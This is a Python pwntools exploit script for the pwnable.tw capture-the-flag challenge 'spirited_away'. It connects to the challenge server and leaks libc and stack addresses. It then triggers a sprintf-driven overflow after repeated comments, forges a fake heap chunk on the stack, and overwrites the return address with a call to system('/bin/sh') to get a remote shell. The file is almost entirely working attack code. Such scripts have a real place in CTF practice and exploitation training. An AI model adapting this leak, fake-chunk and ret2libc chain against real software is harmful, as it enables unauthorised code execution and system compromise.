#sprintf导致整数溢出
from pwn import *

context.log_level = 'debug'
prog = './spirited_away'
elf = ELF(prog)
#p = process(prog)

libc = ELF("./libc_32.so.6")
p = remote('chall.pwnable.tw', 10204)
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
def comment(name, age, reason, comment):
	p.sendafter("name: ", name)
	p.sendafter("age: ", age)
	p.sendafter("movie? ", reason)
	p.sendafter("comment: ", comment)

def comment2(age, reason):
	p.sendafter("age: ", age)
	p.sendafter("movie? ", reason)
def exp():
	#dbg('b*0x80486f8')
	comment('a', '1\n', 'a'*24, 'a')
	p.recvuntil("Reason: " + 'a'*24)
	libc.address = u32(p.recv(4))-libc.sym['_IO_file_sync']-7
	log.info("libc.address == > " + hex(libc.address))
	p.sendafter("<y/n>: ", 'y')
	comment('a', '1\n', 'a'*56, 'a')
	p.recvuntil("Reason: " + 'a'*56)
	stack = u32(p.recv(4))
	log.info("stack == > " + hex(stack))
	reason_addr = stack - 112
	p.sendafter("<y/n>: ", 'y')
	for _ in range(8):
		comment('a', '1\n', 'a', 'a')
		p.sendafter("<y/n>: ", 'y')
	for _ in range(90):
		comment2('1\n', 'a')
		p.sendafter("<y/n>: ", 'y')
	reason = p32(0) + p32(0x41) + 'a'*0x38 + p32(0) + p32(0x41)
	comm = 'a' * 0x54 + p32(reason_addr+8)

	#dbg('b*0x80488d3')
	comment('a', '1\n', reason, comm)
	p.sendafter("<y/n>: ", 'y')
	system = libc.sym['system']
	binsh = libc.search("/bin/sh").next()
	payload = 'a'*0x4c + p32(system)+p32(0)+p32(binsh)
	comment(payload, '1\n', 'a', 'a')
	p.sendafter("<y/n>: ", 'n')
	
	p.interactive()
if __name__ == '__main__':
	exp()
